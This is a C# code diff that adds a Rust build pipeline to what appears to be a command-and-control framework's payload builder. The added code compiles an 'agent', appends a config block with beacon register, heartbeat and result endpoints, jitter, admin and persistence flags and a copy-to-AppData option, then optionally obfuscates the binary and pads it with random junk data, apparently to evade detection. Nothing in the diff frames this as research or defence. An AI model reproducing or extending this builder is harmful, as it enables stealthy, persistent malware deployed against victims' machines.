@@ -26,6 +26,15 @@ public class BuilderController : ControllerBase
         ["arm"] = "linux-arm64",
     };
 
+    private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "..", "agent-rs"));
+
+    private static readonly Dictionary<string, string> RustTargetTriple = new()
+    {
+        ["x64"] = "x86_64-pc-windows-msvc",
+        ["x86"] = "i686-pc-windows-msvc",
+        ["arm"] = "aarch64-unknown-linux-gnu",
+    };
+
     private static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");
     private static readonly object _buildLock = new();
     private static readonly ConcurrentDictionary<string, BuildJob> _activeJobs = new();
@@ -260,6 +269,12 @@ public class BuilderController : ControllerBase
 
         try
         {
+            if (req.Language == "rust")
+            {
+                await RunRustBuildAsync(buildId, req, rid, job);
+                return;
+            }
+
             lock (_buildLock)
             {
                 if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true);
@@ -474,6 +489,211 @@ public class BuilderController : ControllerBase
         }
     }
 
+    // ── Rust build ──────────────────────────────────────────────────────
+
+    private async Task RunRustBuildAsync(string buildId, BuildConfigRequest req, string rid, BuildJob job)
+    {
+        var tempDir = Path.Combine(OutputBase, buildId);
+        var targetDir = Path.Combine(tempDir, "target");
+
+        try
+        {
+            lock (_buildLock)
+            {
+                if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true);
+                Directory.CreateDirectory(tempDir);
+            }
+
+            // Check cargo availability
+            job.Log("Checking Rust toolchain...");
+            var cargoCheck = await RunProcessAsync("cargo", "--version", job);
+            if (cargoCheck.ExitCode != 0)
+            {
+                job.Fail("Cargo/Rust is not installed. Install from https://rustup.rs");
+                UpdateHistory(job);
+                return;
+            }
+            job.Log($"Rust toolchain: {cargoCheck.Stdout.Trim()}");
+
+            // Determine target triple
+            string? targetTriple = null;
+            if (RustTargetTriple.TryGetValue(req.Platform, out var triple))
+            {
+                targetTriple = triple;
+            }
+
+            // Build target arg
+            var targetArg = targetTriple != null ? $"--target {targetTriple}" : "";
+
+            // Run cargo build
+            job.Log($"Building Rust agent (platform: {req.Platform}{(targetTriple != null ? ", target: " + targetTriple : "")})...");
+            job.Log($"cargo build --release {targetArg} --target-dir \"{targetDir}\"");
+
+            var buildArgs = $"build --release {targetArg} --target-dir \"{targetDir}\"";
+            // Run cargo from the agent-rs workspace root
+            var buildResult = await RunProcessAsync("cargo", buildArgs, job, RustAgentDir);
+
+            if (buildResult.ExitCode != 0)
+            {
+                job.Fail($"cargo build exited with code {buildResult.ExitCode}");
+                UpdateHistory(job);
+                return;
+            }
+
+            // Find output binary
+            var releaseDir = targetTriple != null
+                ? Path.Combine(targetDir, targetTriple, "release")
+                : Path.Combine(targetDir, "release");
+
+            var exeName = (targetTriple != null && targetTriple.Contains("windows")) || targetTriple == null
+                ? "agent.exe"
+                : "agent";
+
+            var exePath = Path.Combine(releaseDir, exeName);
+            if (!System.IO.File.Exists(exePath))
+            {
+                // Try searching
+                var found = Directory.GetFiles(releaseDir, "*")
+                    .FirstOrDefault(f => Path.GetFileName(f) == "agent" || Path.GetFileName(f) == "agent.exe");
+                if (found != null)
+                    exePath = found;
+            }
+
+            if (!System.IO.File.Exists(exePath))
+            {
+                job.Fail($"cargo build succeeded but output binary not found at {releaseDir}");
+                UpdateHistory(job);
+                return;
+            }
+
+            job.Log($"Binary found: {exePath}");
+
+            // ── Config injection: append CONFIG_MAGIC + length + JSON ──
+            job.Log("Injecting build config...");
+            var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
+            var injectedConfig = new InjectedConfig
+            {
+                server_url = serverUrl,
+                register_path = "/api/beacon/register",
+                heartbeat_path = "/api/beacon/heartbeat",
+                result_path = "/api/beacon/result",
+                ws_path = "/ws/agent",
+                heartbeat_interval_ms = 3000,
+                jitter_percent = 0.2,
+                require_admin = req.RequireAdmin,
+                copy_to_path = req.CopyToAppData ? "LibraNextgen" : null,
+                enable_persistence = req.EnablePersistence,
+            };
+
+            var configJson = JsonSerializer.Serialize(injectedConfig);
+            var configBytes = Encoding.UTF8.GetBytes(configJson);
+            var magicBytes = Encoding.UTF8.GetBytes("LIBRA_CFG_BLOCK!");
+
+            await using (var fs = System.IO.File.Open(exePath, FileMode.Append))
+            {
+                // Magic
+                await fs.WriteAsync(magicBytes);
+                // Length (4 bytes, little-endian)
+                var lenBytes = BitConverter.GetBytes((uint)configBytes.Length);
+                await fs.WriteAsync(lenBytes);
+                // JSON payload
+                await fs.WriteAsync(configBytes);
+            }
+
+            job.Log($"Config injected: {configJson.Length} bytes");
+
+            // ── Goldberg obfuscation ──
+            if (req.EnableObfuscation)
+            {
+                job.Log("Running goldberg obfuscation...");
+                try
+                {
+                    var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{exePath}\"", job);
+                    if (goldbergResult.ExitCode == 0)
+                        job.Log("Goldberg obfuscation completed.");
+                    else
+                        job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
+                }
+                catch (Exception ex)
+                {
+                    job.Log($"[WARN] goldberg not available: {ex.Message}");
+                }
+            }
+
+            // ── Junk data injection ──
+            if (req.InjectJunkData && req.JunkDataMb > 0)
+            {
+                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
+                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
+                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
+                await fs.WriteAsync(junk);
+            }
+
+            // ── Move to final output ──
+            var finalDir = Path.Combine(OutputBase, buildId);
+            var finalPath = Path.Combine(finalDir, job.Record.FileName);
+            Directory.CreateDirectory(finalDir);
+            System.IO.File.Copy(exePath, finalPath, true);
+
+            var fileInfo = new FileInfo(finalPath);
+            job.Complete(fileInfo.Length);
+            job.Log($"Build complete: {finalPath} ({fileInfo.Length} bytes)");
+
+            UpdateHistory(job);
+        }
+        catch (Exception ex)
+        {
+            job.Fail($"Rust build failed: {ex.Message}");
+            UpdateHistory(job);
+        }
+        finally
+        {
+            _ = Task.Run(async () =>
+            {
+                await Task.Delay(30_000);
+                _activeJobs.TryRemove(buildId, out _);
+            });
+        }
+    }
+
+    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null)
+    {
+        var psi = new ProcessStartInfo(fileName, arguments)
+        {
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false,
+            CreateNoWindow = true,
+        };
+        if (workingDir != null) psi.WorkingDirectory = workingDir;
+
+        using var proc = new Process { StartInfo = psi };
+        var stdoutTcs = new TaskCompletionSource<string>();
+        var stderrTcs = new TaskCompletionSource<string>();
+        var stdout = new StringBuilder();
+        var stderr = new StringBuilder();
+
+        proc.OutputDataReceived += (_, e) =>
+        {
+            if (e.Data != null) { job.Log(e.Data); stdout.AppendLine(e.Data); }
+            else stdoutTcs.TrySetResult(stdout.ToString());
+        };
+        proc.ErrorDataReceived += (_, e) =>
+        {
+            if (e.Data != null) { job.Log($"[stderr] {e.Data}"); stderr.AppendLine(e.Data); }
+            else stderrTcs.TrySetResult(stderr.ToString());
+        };
+
+        proc.Start();
+        proc.BeginOutputReadLine();
+        proc.BeginErrorReadLine();
+        await proc.WaitForExitAsync();
+        var stdoutStr = await stdoutTcs.Task;
+        var stderrStr = await stderrTcs.Task;
+
+        return new ProcessResult(proc.ExitCode, stdoutStr, stderrStr);
+    }
+
     private static void UpdateHistory(BuildJob job)
     {
         var history = LoadHistory();
@@ -530,6 +750,8 @@ public class BuildRecord
     public string CreatedAt { get; set; } = "";
     public string? CompletedAt { get; set; }
 }
+
+internal record struct ProcessResult(int ExitCode, string Stdout, string Stderr);
 
 public class BuildJob
 {
